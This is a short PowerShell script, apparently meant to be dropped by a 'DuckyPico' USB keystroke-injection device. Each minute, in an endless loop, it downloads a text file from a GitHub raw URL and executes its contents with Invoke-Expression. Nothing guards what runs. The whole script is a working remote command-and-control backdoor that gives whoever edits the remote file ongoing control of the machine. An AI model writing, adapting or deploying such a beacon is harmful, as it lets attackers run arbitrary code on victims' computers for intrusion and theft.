# Define the URL of the GitHub page
$githubUrl = "https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/command.txt"

# Start an infinite loop
while ($true) {
    try {
        # Force a new request and clear the cache by using Invoke-WebRequest
        $response = Invoke-WebRequest -Uri $githubUrl

        # Convert the content to a string explicitly (in case it's byte data)
        $command = [System.Text.Encoding]::UTF8.GetString($response.Content)

        # Check if the command starts with '!!' and strip that part off
        if ($command -like "!!*") {
            $command = $command.Substring(2)
        }

        # Run the command
        Invoke-Expression -Command $command

        # Wait for 60 seconds before the next iteration
        Start-Sleep -Seconds 60
    } catch {
        Write-Host "An error occurred: $_"
        Start-Sleep -Seconds 60
    }
}
